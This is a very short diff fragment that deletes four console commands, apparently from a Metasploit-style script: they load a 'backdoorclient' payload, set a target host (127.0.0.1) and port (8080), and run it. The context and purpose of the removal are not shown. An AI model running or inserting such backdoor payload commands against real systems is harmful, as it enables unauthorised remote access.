@@ -1,4 +1,0 @@
-use payload/backdoorclient
-set RHOST 127.0.0.1
-set RPORT 8080
-run
